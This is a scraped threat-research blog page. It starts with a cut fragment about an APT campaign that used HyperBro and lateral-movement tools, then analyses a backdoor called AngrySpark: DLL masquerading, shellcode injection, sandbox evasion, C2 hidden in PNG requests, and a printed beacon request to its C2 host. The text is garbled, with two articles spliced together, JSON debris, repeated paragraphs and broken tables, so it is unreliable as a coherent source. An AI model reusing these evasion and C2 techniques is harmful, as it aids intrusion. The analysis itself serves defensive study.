then used to send emails from the hacked company’s email accounts to the government officials. While we were unable to recover the whole email, we’ve managed to recover the email’s header. The header indicates that these emails were asking the recipient to update a firmware, i.e. launch a self-extracting 7-zip archive attached to this email.\u003c/p\u003e\u003cp\u003eDate: Sun, 28 Jun 2020 20:43:08 +0800 (ULAT)\u0026nbsp;\u003cbr\u003eSubject: Re: Perform a firmware update on the server\u003c/p\u003e\u003cp\u003eXXXXXX_update.exe\u0026nbsp;\u003c/p\u003e\u003cp\u003e(sha256:2D2EA3002C367684F21AD08BDC9B5079EBDEE08B6356AC5694EFA139D4C6E60D)\u003c/p\u003e\u003cp\u003eThis archive drops three already familiar files – Symantec’s \u003cem\u003ethinprobe.exe\u003c/em\u003e, malicious \u003cem\u003ethinhostprobedll.dll\u003c/em\u003e, and \u003cem\u003ethumb.db\u003c/em\u003e. The malicious DLL is used for DLL sideloading, decrypting and decompressing \u003cem\u003ethumb.db\u003c/em\u003e and finally loading its processed content – a HyperBro RAT . This backdoor has also been reported on by \u003ca href=\"https://securelist.com/luckymouse-hits-national-data-center/86083/\"\u003eKaspersky[1]\u003c/a\u003e and \u003ca href=\"https://unit42.paloaltonetworks.com/emissary-panda-attacks-middle-east-government-sharepoint-servers/\"\u003ePaloAlto Networks[3]\u003c/a\u003e, the latter providing an extensive description of the HyperBro this following section we describe a tool set we found on the victim’s PC, used by the APT group for cyber-espionage and lateral movement through the network. We could divide these tools into three categories:\u003c/p\u003e\u003cul\u003e\u003cli\u003eHelpers: ServiceInstaller, ShellCodeExecutor, DataExtractor 1/2, Information Collector\u003c/li\u003e\u003cli\u003eRemote access: StartServiceTool, Korplug, LuckyBack, BlueTraveller, Polpo\u003c/li\u003e\u003cli\u003ePublicly available tools: UAC bypass tool, port scanners, password dumpers, FRP, Earthworm tunneler\u003c/li\u003e\u003c/ul\u003e\u003cp\u003eIn detail, we found the following tools:\u003c/p\u003e\u003ch2\u003e\u003cstrong\u003eStartServiceTool\u003c/strong\u003e\u003c/h2\u003e\u003cp\u003eThis tool installs \u003cem\u003ewcm.dll\u003c/em\u003e into \u003cem\u003e%WINDIR%\\system32\u003c/em\u003e, a registry record\u003c/p\u003e\u003cp\u003eHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WindowsConnections Manager\u003c/p\u003e\u003cp\u003eis created with the following values:\u003c/p\u003e\u003cp\u003eDescription: Makes automatic connect/disconnect decisions based on the network connectivity options currently available to the PC and enables management of network connectivity based on Group Policy settings.\u003c/p\u003e\u003cp\u003eDisplayName: Windows Connections Manager\u003c/p\u003e\u003cp\u003eServiceDll: C:\\Windows\\system32\\wcm.dll.\u003c/p\u003e\u003cp\u003eThis effectively creates a new service. The dropped binary is a 32-bit service DLL that has two parts – embedded DLL, and mmLoader (\u003ca href=\"http://tishion.github.io/mmLoader/\"\u003ehttp://tishion.github.io/mmLoader/\u003c/a\u003e), a loader that bypasses the windows loader.\u003c/p\u003e\u003cp\u003eThe final payload DLL is written in GO and contains a single export named “Interface“. This function expects 4 arguments consisting of two strings and their corresponding lengths. The string values specify the victim ID and the Dropbox API key to use. The API key is passed in as an RC4 encrypted + base64 encoded value.\u003cbr\u003eThe hardcoded decryption key is “0000111122223333“. ","authors":[{"socialLinks":[],"bio":"A group of elite researchers who like to stay under the radar.","displayName":"Threat Research Team","title":"Threat Research 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_author_bio_large_2x/public/blog-author-pictures/AdobeStock_618554154-2-2048x886.jpeg.webp?h=d91d38c4\u0026itok=zua2szJm 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_author_avatar_small_2x/public/blog-author-pictures/AdobeStock_618554154-2-2048x886.jpeg.webp?h=d91d38c4\u0026itok=iDSFMEuk 2x","media":"(min-width: 420px)","type":"image/webp","width":120,"height":120}],"caption":"","url":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_author_avatar_small/public/blog-author-pictures/AdobeStock_618554154-2-2048x886.jpeg.webp?h=d91d38c4\u0026itok=uIL3f30w"}}],"contributingAuthors":[],"products":[],"paragraphs":[{"bundle":"rich_text","content":"\u003cp\u003eIn the spring of 2022, our anti-rootkit engine flagged something unusual inside a svchost.exe process on a machine in the United Kingdom. A chunk of memory -roughly 32 kilobytes- was making direct NtQuerySystemInformation syscalls, bypassing every usermode hook we had in place. When we pulled the memory dump and opened it in a disassembler, we found not just shellcode, but an entire virtual machine: a custom bytecode interpreter running a 25-kilobyte program, decoding its own payload on the fly, resolving APIs through hash lookups, and checking for hypervisors before executing a single line of its real code.\u003c/p\u003e\u003cp\u003eWe named it AngrySpark -after the C++ namespace angry_spark found in the RTTI metadata of the DLL that delivered it. Over the following year, we captured three memory snapshots from the same host, watched its C2 infrastructure evolve, and eventually saw the connection get blocked. Then it vanished. No new samples. No new infrastructure. No second victim. Just a single spark in the dark.\u003c/p\u003e\u003cp\u003eThis is the story of how we took it apart.\u003c/p\u003e\u003ch2\u003eWhy AngrySpark matters\u003c/h2\u003e\u003cp\u003eMost backdoors pick a lane. AngrySpark built three of them. The DLL, the VM, and the beacon each carry their own encryption, their own API resolution, and their own C2 channel. Compromise one layer and the other two remain opaque.\u003c/p\u003e\u003cp\u003eThat architecture is what elevates it from a well-built backdoor to something worth writing up. The payload is assembled from bytecode at runtime, so the operator can swap out the final-stage binary, change the API set, add anti-analysis checks, or rotate C2 URLs by pushing a new 25KB blob. The 6.5KB loader never changes. It behaves more like a deployment framework than a conventional dropper.\u003c/p\u003e\u003cp\u003eThe other reason it matters is the mismatch between effort and scope. The engineering is serious: a VM-based deployment framework, dual encrypted C2 channels, CET-aware anti-analysis, runtime code patching, and direct syscalls with a 24-build compatibility table. Yet it appeared on a single machine in the United Kingdom, ran for about a year, and disappeared when its infrastructure expired.\u003c/p\u003e\u003cp\u003eNo public malware repository carried the DLL during its operational life, and no other vendor published on it. That does not make AngrySpark more important than broader campaigns, but it does make it unusually revealing. It looks like high-effort malware deployed with a very limited visible footprint.\u003c/p\u003e\u003ch2\u003eThe architecture at a glance\u003c/h2\u003e\u003cp\u003eAngrySpark operates as a three-stage system. A DLL masquerading as a Windows component loads via the Task Scheduler, decrypts its configuration from the registry, and injects position-independent shellcode into svchost.exe. That shellcode implements a virtual machine. The VM processes a 25KB blob of bytecode instructions, decoding and assembling the real payload -- a beacon that profiles the machine, phones home over HTTPS disguised as PNG image requests, and can receive encrypted shellcode for execution.\u003c/p\u003e\u003cp\u003eEach stage is designed to be independently replaceable. The VM's bytecode format means the operator can swap out the payload, change the configuration, rotate C2 URLs, or add new anti-analysis checks -- all without modifying a single byte of the loader code.\u003c/p\u003e\u003ctable class=\"table\"\u003e\u003cthead\u003e\u003ctr\u003e\u003cth\u003e\u003cstrong\u003eStage\u003c/strong\u003e\u003c/th\u003e\u003cth\u003e\u003cstrong\u003eRole\u003c/strong\u003e\u003c/th\u003e\u003cth\u003e\u003cstrong\u003eKey idea\u003c/strong\u003e\u003c/th\u003e\u003c/tr\u003e\u003c/thead\u003e\u003ctbody\u003e\u003ctr\u003e\u003ctd\u003eStage 0, DLL loader\u003c/td\u003e\u003ctd\u003eMasquerades as a Windows Task Scheduler extension, decrypts config from the registry, and injects shellcode into svchost.exe\u003c/td\u003e\u003ctd\u003eA quiet entry point with persistence, configuration handling, and self-removal logic\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd\u003eStage 1, VM loader\u003c/td\u003e\u003ctd\u003eRuns a custom bytecode interpreter that assembles the real payload at runtime\u003c/td\u003e\u003ctd\u003eThe operator can change behavior by updating the blob rather than the loader\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd\u003eStage 2, beacon\u003c/td\u003e\u003ctd\u003eProfiles the host, communicates over HTTPS disguised as PNG image requests, and can execute encrypted shellcode from the server\u003c/td\u003e\u003ctd\u003eA full C2 channel built to blend in and stay adaptable\u003c/td\u003e\u003c/tr\u003e\u003c/tbody\u003e\u003c/table\u003e\u003cp\u003e\u0026nbsp;\u003c/p\u003e\u003ch3\u003eStage 0, the DLL loader\u003c/h3\u003e\u003cp\u003eThe entry point is a 200KB DLL named WptsExtensions.dll, the exact name of a legitimate Windows Task Scheduler extension library. It exports the same five functions (WptsCopyActionData, WptsCreateAction, WptsDestroyAction, WptsFreeActionData, WptsLaunchAction) and spoofs its version info as \"Microsoft Corporation, v10.0.19041.1023\".\u003c/p\u003e\u003cp\u003eAfter loading its configuration, the DLL injects the VM shellcode into a svchost.exe service host process. The injected code is entirely position-independent. It carries its own API resolver, its own exception handler, and its own syscall dispatcher. No imports, no relocations, no PE headers.\u003c/p\u003e\u003ch3\u003eStage 1, the virtual machine\u003c/h3\u003e\u003cp\u003eThe VM loader is a ~6.5KB position-independent shellcode that implements a bytecode interpreter. It reads instructions sequentially from a 25KB configuration blob, dispatching each to a handler function. The blob contains approximately 190 entries (VM instructions) encoded in a custom format.\u003c/p\u003e\u003cp\u003eThe May 2022 variant has 23 entries (syscall tables. Between May and June 2022, the operator added a single entry: build 20344, a Windows 10 Insider preview from the Iron/Cobalt development cycle -- the branch that became Windows 11. The June and January variants are identical (24 entries, table at 0x13A2).\u003c/p\u003e\u003cp\u003eThis tells us two things. First, the operator was actively maintaining the syscall table and testing against Insider builds during May-June 2022. Second, they stopped updating after that. Builds above 22000 (Win11 22H2, 23H2) are not covered, and the entry-point guard rejects them outright. The shellcode was frozen sometime in mid-2022.\u003c/p\u003e\u003ch3\u003eStage 2, the beacon\u003c/h3\u003e\u003cp\u003eThe assembled payload is a 27KB position-independent shellcode with 74 functions. It implements a full C2 beacon with system profiling, encrypted communication, and remote code execution.\u003c/p\u003e\u003cp\u003eThe beacon disguises its check-in as a request for a PNG image:\u003c/p\u003e\u003cp\u003eThe encrypted shellcode is decrypted with the second XXTEA key from the configuration, then executed in freshly allocated memory. After execution, the results are XXTEA-encrypted and sent back via HTTP POST to a separate .php endpoint.\u003c/p\u003e\u003ch2\u003eStealth, anti-analysis, and self-removal\u003c/h2\u003e\u003cp\u003eAngrySpark is not only modular, it is also careful about how it appears to defenders. Several design choices look specifically aimed at frustrating clustering, bypassing instrumentation, and limiting the forensic residue left behind.\u003c/p\u003e\u003cp\u003eThe binary's PE metadata has been deliberately altered to confuse toolchain fingerprinting.\u003c/p\u003e\u003ch3\u003eNotable defensive friction points\u003c/h3\u003e\u003cul type=\"disc\"\u003e\u003cli data-list-item-id=\"ed531a883985e6ff1ea0b5526cc40abfc\"\u003eThe PE timestamp is falsified, and the Rich header was modified after compilation in a way that breaks straightforward toolchain fingerprinting.\u003c/li\u003e\u003cli data-list-item-id=\"e9519384a4b6896277de1f1a911e912fd\"\u003eThe shellcode uses direct syscalls to get around usermode API hooks.\u003c/li\u003e\u003cli data-list-item-id=\"eee6db62c8e4b4429a19949b6ac9524f9\"\u003eThe VM includes hypervisor checks and CET or Shadow Stack aware anti-analysis logic.\u003c/li\u003e\u003cli data-list-item-id=\"e0bba18ae1c14f5eb447d8061bc1654bc\"\u003eThe DLL pins the C2 server's TLS certificate fingerprint, reject\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; ing connections to anything that does not match the expected infrastructure. If someone sinkholed the domain or stood up a proxy with a different certificate, the DLL would refuse to talk.\u003c/li\u003e\u003cli data-list-item-id=\"ecbf5d179746f6984a71674a8cdd15326\"\u003eThe loader can remove itself if contact goes stale or if the server explicitly tells it to do so.\u003c/li\u003e\u003c/ul\u003e\u003cp\u003eThe heartbeat serves a second purpose: it is a dead man's switch. On each beacon cycle, the DLL compares the current time against the stored heartbeat. If the difference exceeds a configurable threshold (stored as a day count in the config blob, multiplied by 864000000000 -- one day in 100-nanosecond FILETIME intervals), the DLL enters its self-destruct sequence: it wipes the encrypted registry blob via RegDeleteValue, then schedules its own DLL file for deletion on the next reboot using MoveFileExW with the MOVEFILE_DELAY_UNTIL_REBOOT flag. Before that, it impersonates itself with SeSecurityPrivilege, SeRestorePrivilege, and SeTakeOwnershipPrivilege, moves the DLL to a temp directory, and restricts its permissions.\u003c/p\u003e\u003cp\u003eThere is a second trigger. If the C2 server responds with HTTP 200 (rather than the expected 302 redirect that delivers encrypted commands), the DLL treats this as a server-side kill command. It runs the same cleanup: wipe registry, schedule file deletion, exit. The normal operating response is a 302 redirect whose Location header provides the URL for the encrypted payload exchange.\u003c/p\u003e\u003cp\u003eIn other words: a 200 means \"acknowledged, self-destruct,\" and a 302 means \"here are your orders.\" No contact at all for too long also means self-destruct. The operator built the backdoor to vanish automatically if it lost its handler -- which is exactly what happened in April 2023.\u003c/p\u003e\u003ch2\u003eCommand and control design, and how the operation evolved\u003c/h2\u003e\u003cp\u003eAngrySpark uses two separate C2 channels, each with its own domain, IP address, and encryption layer.\u003c/p\u003e\u003cp\u003eThe two C2 channels don't share anything except a hosting provider. AES-256-CBC + RSA-4096 on one side, XXTEA + custom Base64 + PNG steganography on the other. Different encryption, different protocols, different domains, different IPs, all within the same 185.151.28.0/22 range. The custom Base64 alphabet rotates with each configuration update, so there's no fixed encoding to write a signature against.\u003c/p\u003e\u003cp\u003eEach configuration update carried new randomized URL paths, though the domain and C2 structure remained consistent:\u003c/p\u003e\u003cp\u003eThe pattern is clear: random 6-8 character slug, incrementing 4-digit counter, random filename. Combined with a custom Base64 alphabet that also rotates per update, this defeats static network signatures while maintaining a recognizable structure for the operator.\u003c/p\u003e\u003ctable class=\"table\"\u003e\u003cthead\u003e\u003ctr\u003e\u003cth\u003e\u003cstrong\u003ePoint in time\u003c/strong\u003e\u003c/th\u003e\u003cth\u003e\u003cstrong\u003eWhat changed\u003c/strong\u003e\u003c/th\u003e\u003c/tr\u003e\u003c/thead\u003e\u003ctbody\u003e\u003ctr\u003e\u003ctd\u003eMay 2022\u003c/td\u003e\u003ctd\u003eMay 2022: The first variant uses NtQuerySystemInformation(40) (SystemCodeIntegrityInformation). The shellcode prologue differs from later versions. Syscall table has 23 entries, no Insider builds.\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd\u003eJune 2022\u003c/td\u003e\u003ctd\u003eJune 2022: Rewritten loader with a different code structure but identical C2 domain. URL paths rotated. Syscall table gains one entry: build 20344 (Win10 Insider Fe/Co), bumping it to 24 entries. The operator was actively updating both code and compatibility data.\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd\u003eJanuary 2023\u003c/td\u003e\u003ctd\u003eJanuary 2023: Same code as June 2022 (identical syscall table), but the NtQuerySystemInformation argument changed to class 10 (SystemModuleInformation) and URLs rotated again. The code was frozen; only the configuration blob changed.\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd\u003eApril to June 2023\u003c/td\u003e\u003ctd\u003eBy April 2023, the C2 connection was blocked. By May, the beacon domain expired. By June, the DLL's C2 certificate expired. The infrastructure was never renewed.\u003c/td\u003e\u003c/tr\u003e\u003c/tbody\u003e\u003c/table\u003e\u003cp\u003e\u0026nbsp;\u003c/p\u003e\u003cp\u003eThe timeline suggests active maintenance in mid-2022, followed by a freeze in the shellcode and continued rotation only in the configuration and network paths. Then the infrastructure stopped being renewed. That sequence matters because it makes the disappearance look operational, not accidental.\u003c/p\u003e\u003ch2\u003eWhat we still do not know\u003c/h2\u003e\u003cp\u003eYet it appeared on a single machine in the United Kingdom, ran for about a year, and disappeared when its infrastructure expired. The DLL never surfaced in any public malware archive. No other vendor has published on it.\u003c/p\u003e\u003cp\u003eWas it a targeted operation that achieved its objective and was burned? A test deployment that was abandoned? A contractor's proof of concept? We don't know.\u003c/p\u003e\u003cp\u003eWhat we do know is that somewhere in the RTTI metadata of a tampered DLL, someone chose the namespace angry_spark and the exception class sombrely_exception. They built a virtual machine to deploy their payload, wrapped it in three layers of encryption, hid their commands inside PNG images, and then -- quietly, sombrely -- let it all expire. What we do know is that somewhere in the RTTI metadata of a tampered DLL, someone chose the namespace angry_spark and populated it with nine C++ classes: BCryptSymmetricKey, BCryptAsymmetricKey, BCryptKey, crypto_exception, connection_exception, wininet_exception, angry_spark_exception, bad_config_exception, and -- curiously -- sombrely_exception. They built a virtual machine to deploy their payload, wrapped it in three layers of encryption, hid their commands inside PNG images, and then -- quietly, sombrely -- let it all expire.\u003c/p\u003e\u003cp\u003eThe spark went out. But the code remains.\u003c/p\u003e\u003cp\u003eFor readers who want the deeper reverse engineering detail, the appendix below preserves the underlying technical observations, tables, and selected code fragments from the working draft in a more reference-oriented format.\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u0026nbsp;\u003c/p\u003e\u003cp\u003e\u0026nbsp;\u003c/p\u003e\u003ch2\u003eTechnical Appendix\u003c/h2\u003e\u003ch3\u003eAppendix A. Detailed Stage 0 notes\u003c/h3\u003e\u003cp\u003eThe entry point is a 200KB DLL named WptsExtensions.dll, the exact name of a legitimate Windows Task Scheduler extension library. It exports the same five functions (WptsCopyActionData, WptsCreateAction, WptsDestroyAction, WptsFreeActionData, WptsLaunchAction) and spoofs its version info as \"Microsoft Corporation, v10.0.19041.1023\".\u003c/p\u003e\u003cp\u003eThe DLL was never uploaded to VirusTotal. It remained invisible to the public threat intelligence ecosystem for the entirety of its operational life.\u003c/p\u003e\u003cp\u003eThe DLL stores its encrypted configuration in the Windows registry under a path that itself is encrypted.\u003c/p\u003e\u003cp\u003eA heartbeat timestamp (FILETIME) at bytes 0-7 of the registry value is updated after each successful beacon, allowing the operator to track the last check-in time.\u003c/p\u003e\u003cp\u003eThe heartbeat serves a second purpose: it is a dead man's switch. On each beacon cycle, the DLL compares the current time against the stored heartbeat. If the difference exceeds a configurable threshold (stored as a day count in the config blob, multiplied by 864000000000 -- one day in 100-nanosecond FILETIME intervals), the DLL enters its self-destruct sequence: it wipes the encrypted registry blob via RegDeleteValue, then schedules its own DLL file for deletion on the next reboot using MoveFileExW with the MOVEFILE_DELAY_UNTIL_REBOOT flag. Before that, it impersonates itself with SeSecurityPrivilege, SeRestorePrivilege, and SeTakeOwnershipPrivilege, moves the DLL to a temp directory, and restricts its permissions.\u003c/p\u003e\u003cp\u003eThere is a second trigger. If the C2 server responds with HTTP 200 (rather than the expected 302 redirect that delivers encrypted commands), the DLL treats this as a server-side kill command. It runs the same cleanup: wipe registry, schedule file deletion, exit. The normal operating response is a 302 redirect whose Location header provides the URL for the encrypted payload exchange.\u003c/p\u003e\u003cp\u003eIn other words: a 200 means \"acknowledged, self-destruct,\" and a 302 means \"here are your orders.\" No contact at all for too long also means self-destruct. The injected code is entirely position-independent. It carries its own API resolver, its own exception handler, and its own syscall dispatcher. No imports, no relocations, no PE headers.\u003c/p\u003e\u003ctable class=\"table\"\u003e\u003cthead\u003e\u003ctr\u003e\u003cth\u003e\u003cstrong\u003eClaimed tool Detailed Stage 1 notes\u003c/h3\u003e\u003cp\u003eThe VM loader is a ~6.5KB position-independent shellcode that implements a bytecode interpreter. It reads instructions sequentially from a 25KB configuration blob, dispatching each to a handler function. The blob contains approximately 190 entries encoded in a custom format:\u003c/p\u003e\u003cp\u003eThe VM implements 22 distinct opcodes -- a complete deployment toolkit:\u003c/p\u003e\u003cp\u003eA typical blob is processed in phases:\u003c/p\u003e\u003cp\u003eEvery string, API name, DLL name, and code chunk in the blob is encoded with a cascading XOR cipher. The format is deceptively simple:\u003c/p\u003e\u003cp\u003e\u003ccode\u003e[total_length: 1 byte][data: N bytes][checksum1: 1 byte][checksum2: 1 byte]\u003c/code\u003e\u003c/p\u003e\u003cp\u003eThe two checksum bytes double as XOR keys. Decoding works backwards through the data, using separate key chains for even and odd byte positions. After decoding, the original checksums are recomputed using seeds 0x23 and 0xA5 and verified against the saved keys. If either mismatches, the entry is rejected.\u003c/p\u003e\u003cp\u003eThe maximum decoded payload is 253 bytes (limited by the single-byte length field). This is why the 27KB payload requires 93 separate DECODE_COPY instructions.\u003c/p\u003e\u003cp\u003eThe VM resolves all APIs by walking the Process Environment Block (PEB), iterating loaded modules, and comparing DJB2 hashes of export names:\u003c/p\u003e\u003cp\u003e\u003ccode\u003ehash = 5381\u003c/code\u003e\u003cbr\u003e\u003ccode\u003efor byte in name:\u003c/code\u003e\u003cbr\u003e\u003ccode\u003ehash = (hash * 33 + byte) \u0026amp; 0xFFFFFFFF\u003c/code\u003e\u003c/p\u003e\u003cp\u003eTwo variants exist: one for UNICODE_STRING (with case folding via | 0x20), used to find DLLs by name, and one for ASCII byte strings, used to match export table entries.\u003c/p\u003e\u003ctable blob regions\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd\u003eAnti-analysis\u003c/td\u003e\u003ctd\u003eANTI_ANALYSIS, SET_FLAGS\u003c/td\u003e\u003ctd\u003eHypervisor + CET/Shadow Stack detection, selective debug traps\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd\u003eInfrastructure\u003c/td\u003e\u003ctd\u003eSETUP_TRAMPOLINE, INIT_EXCEPT, 7 / SP1\u003c/td\u003e\u003ctd\u003e0x20\u003c/td\u003e\u003ctd\u003e0x20\u003c/td\u003e\u003ctd\u003e0x20\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd\u003e9200\u003c/td\u003e\u003ctd\u003eWindows 8\u003c/td\u003e\u003ctd\u003e0x21\u003c/td\u003e\u003ctd\u003e0x21\u003c/td\u003e\u003ctd\u003e0x21\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd\u003e9600\u003c/td\u003e\u003ctd\u003eWindows 8.1\u003c/td\u003e\u003ctd\u003e0x22\u003c/td\u003e\u003ctd\u003e0x22\u003c/td\u003e\u003ctd\u003e0x22\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd\u003e10240-19044\u003c/td\u003e\u003ctd\u003eWin10 1507-21H2\u003c/td\u003e\u003ctd\u003e0x23\u003c/td\u003e\u003ctd\u003e0x23\u003c/td\u003e\u003ctd\u003e0x23\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd\u003e20344\u003c/td\u003e\u003ctd\u003eWin10 Insider (Fe/Co)\u003c/td\u003e\u003ctd\u003e--\u003c/td\u003e\u003ctd\u003e0x23\u003c/td\u003e\u003ctd\u003e0x23\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd\u003e22000\u003c/td\u003e\u003ctd\u003eWin11 21H2\u003c/td\u003e\u003ctd\u003e0x23\u003c/td\u003e\u003ctd\u003e0x23\u003c/td\u003e\u003ctd\u003e0x23\u003c/td\u003e\u003c/tr\u003e\u003c/tbody\u003e\u003c/table\u003e\u003cp\u003e\u0026nbsp;\u003c/p\u003e\u003cp\u003eThe May 2022 variant has 23 entries (table at offset 0x1312). Between May and June 2022, the operator added a single entry: build 20344, a Windows 10 Insider preview from the Iron/Cobalt development cycle -- the branch that became Windows 11. The June and January variants are identical (24 entries, table at 0x13A2).\u003c/p\u003e\u003cp\u003eThis tells us two things. First, the operator was actively maintaining the syscall table and testing against Insider builds during May-June 2022. Second, they stopped updating after that. Builds above 22000 (Win11 22H2, 23H2) are not covered, and the entry-point guard rejects them outright. The shellcode was frozen sometime in mid-2022.\u003c/p\u003e\u003cp\u003eThe VM scans msvcrt.dll's code sections for a specific 12-byte x64 instruction pattern:\u003c/p\u003e\u003cp\u003e\u003ccode\u003e48 8D 15 XX XX XX XX lea rdx, [rip + offset] ; string ptr\u003c/code\u003e\u003cbr\u003e\u003ccode\u003e48 8B C8 mov rcx, rax\u003c/code\u003e\u003cbr\u003e\u003ccode\u003eFF 15 YY YY YY YY call [rip + offset] ; indirect call\u003c/code\u003e\u003c/p\u003e\u003cp\u003eWhen a match is found, the VM XOR-decodes a target string, compares it against the data at the lea target, and if it matches, captures the indirect call target -- provided it points into KERNELBASE.dll or KERNEL32.dll. This hijacks specific CRT internal function pointers for exception dispatch, allowing the loader to intercept control flow without modifying the exception handler chain.\u003c/p\u003e\u003cp\u003eBefore any payload code runs, the VM applies several checks:\u003c/p\u003e\u003cp\u003eThe RDSSPQ instruction reads the Shadow Stack Pointer. Intel's Control-flow Enforcement Technology (CET) is primarily found in instrumented environments and certain hypervisors, so a non-zero SSP is a strong signal that the code is running under analysis or in a hardened VM.\u003c/p\u003e\u003cp\u003eDuring our emulation of the VM bytecode, three instruction types initially defied classification:\u003c/p\u003e\u003cp\u003eType 21 is the anti-sandbox kill switch. The 4-byte parameter controls it: when set to 0, the VM checks for a hypervisor (via CPUID) and a non-zero Shadow Stack Pointer (via the RDSSPQ instruction). If both are detected on Windows 10 version 2004 or later, the entire loader aborts with error code 0xAACFBB1A. This is a targeted anti-sandbox technique -- most analysis environments running recent Windows versions with hardware-assisted security features would trigger this check.\u003c/p\u003e\u003ctable class=\"table\"\u003e\u003cthead\u003e\u003ctr\u003e\u003cth\u003e\u003cstrong\u003eBlob Type\u003c/strong\u003e\u003c/th\u003e\u003cth\u003e\u003cstrong\u003eRaw Byte\u003c/strong\u003e\u003c/th\u003e\u003cth\u003e\u003cstrong\u003eResolution\u003c/strong\u003e\u003c/th\u003e\u003c/tr\u003e\u003c/thead\u003e\u003ctbody\u003e\u003ctr\u003e\u003ctd\u003eType 0\u003c/td\u003e\u003ctd\u003e0x01\u003c/td\u003e\u003ctd\u003eAllocate Memory -- VirtualAlloc the 53KB execution buffer\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd\u003eType 17\u003c/td\u003e\u003ctd\u003e0x12\u003c/td\u003e\u003ctd\u003eException Handler Data -- stores pointer to XOR-encoded API name block used during exception setup\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd\u003eType 21\u003c/td\u003e\u003ctd\u003e0x16\u003c/td\u003e\u003ctd\u003eAnti-Analysis -- conditional abort if hypervisor present + CET Shadow Stack active + OS ≥ Win10 2004\u003c/td\u003e\u003c/tr\u003e\u003c/tbody\u003e\u003c/table\u003e\u003cp\u003e\u0026nbsp;\u003c/p\u003e\u003ch3\u003eAppendix C. Detailed Stage 2, infrastructure, and configuration notes\u003c/h3\u003e\u003cp\u003eThe assembled payload is a 27KB position-independent shellcode with 74 functions. It implements a full C2 beacon with system profiling, encrypted communication, and remote code execution.\u003c/p\u003e\u003cp\u003eNine data collectors run in sequence, each appending results to a session packet:\u003c/p\u003e\u003cp\u003eThe process enumeration has a fallback chain. It first tries the Toolhelp API (CreateToolhelp32Snapshot, Process32FirstW/Process32NextW). If that fails, it falls back to NtQuerySystemInformation with information class 5 (SystemProcessInformation), walking the linked list of SYSTEM_PROCESS_INFORMATION structures. Each process name is hashed with MD5 (via the CryptoAPI), and the hash is added to the session packet.\u003c/p\u003e\u003cp\u003eCollected data flows through a multi-stage encryption pipeline before transmission:\u003c/p\u003e\u003cp\u003eThe XXTEA implementation uses the standard 32-round Feistel structure with a 128-bit key derived from the configuration. The custom Base64 alphabet changes with each configuration update, which defeats signature-based network detection without adding any complexity to the protocol.\u003c/p\u003e\u003cp\u003eThe beacon disguises its check-in as a request for a PNG image:\u003c/p\u003e\u003cp\u003e\u003ccode\u003eGET /assets/static/img/I4o8Pp_41.png HTTP/1.1\u003c/code\u003e\u003cbr\u003e\u003ccode\u003eHost: pick.storewebzone.net\u003c/code\u003e\u003cbr\u003e\u003ccode\u003eUser-Agent: wininet/10.0.19044\u003c/code\u003e\u003cbr\u003e\u003ccode\u003eCache-Control: no-cache\u003c/code\u003e\u003cbr\u003e\u003ccode\u003eConnection: Keep-Alive\u003c/code\u003e\u003c/p\u003e\u003cp\u003eThe server's response contains actual PNG data, but with a custom chunk type. The payload scans for the magic byte 0xA1 followed by a 24-byte header:\u003c/p\u003e\u003cp\u003eThe encrypted shellcode is decrypted with the second XXTEA key from the configuration, then executed in freshly allocated memory. After execution, the results are XXTEA-encrypted and sent back via HTTP POST to a separate .php endpoint.\u003c/p\u003e\u003cp\u003eThe payload uses a packet protocol with 22 entry types for serializing collected data:\u003c/p\u003e\u003cp\u003eEach entry is prefixed with a type byte and length, forming a TLV (Type-Length-Value) structure that the C2 server parses to reconstruct the victim's profile.\u003c/p\u003e\u003cp\u003eAngrySpark uses two separate C2 channels, each with its own domain, IP address, and encryption layer.\u003c/p\u003e\u003cp\u003eThe parent domain server-sys.com was registered in June 2021 through Tucows with WHOIS privacy protection. Several related subdomains (ss1., api., bs.) were observed on the same IP, suggesting purpose-built infrastructure.\u003c/p\u003e\u003cp\u003eBoth IPs fall within the same 185.151.28.0/22 range, suggesting the operator rented multiple VPS instances from the same UK-based hosting provider.\u003c/p\u003e\u003cp\u003eEach configuration update carried new randomized URL paths, though the domain and C2 structure remained consistent:\u003c/p\u003e\u003cp\u003eThe pattern is clear: random 6-8 character slug, incrementing 4-digit counter, random filename. Combined with a custom Base64 alphabet that also rotates per update, this defeats static network signatures while maintaining a recognizable structure for the operator.\u003c/p\u003e\u003cp\u003eThe VM writes 16 configuration key-value pairs into the payload's data segment:\u003c/p\u003e\u003cp\u003eTwo distinct XXTEA keys serve different purposes: key #1 encrypts outbound data (system profiles), while key #2 decrypts inbound payloads (shellcode from the server). This separation means compromising one key doesn't expose the other direction of communication.\u003c/p\u003e\u003cp\u003eThree memory snapshots, each captured months apart, tell the story of a living operation:\u003c/p\u003e\u003cp\u003eMay 2022: The first variant uses NtQuerySystemInformation(40) (SystemCodeIntegrityInformation). The shellcode prologue differs from later versions. Syscall table has 23 entries, no Insider builds.\u003c/p\u003e\u003cp\u003eJune 2022: Rewritten loader with a different code structure but identical C2 domain. URL paths rotated. Syscall table gains one entry: build 20344 (Win10 Insider Fe/Co), bumping it to 24 entries. The operator was actively updating both code and compatibility data.\u003c/p\u003e\u003cp\u003eJanuary 2023: Same code as June 2022 (identical syscall table), but the NtQuerySystemInformation argument changed to class 10 (SystemModuleInformation) and URLs rotated again. The code was 